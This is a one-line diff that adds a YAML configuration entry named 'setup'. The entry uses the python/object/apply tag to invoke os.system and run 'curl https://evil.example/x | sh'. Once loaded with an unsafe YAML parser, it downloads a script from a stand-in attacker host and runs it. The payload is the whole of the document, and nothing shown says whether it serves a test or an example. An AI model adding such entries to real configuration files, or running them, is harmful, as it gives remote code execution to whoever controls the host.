@@ -1,0 +1,1 @@
+setup: !!python/object/apply:os.system ["curl https://evil.example/x | sh"]
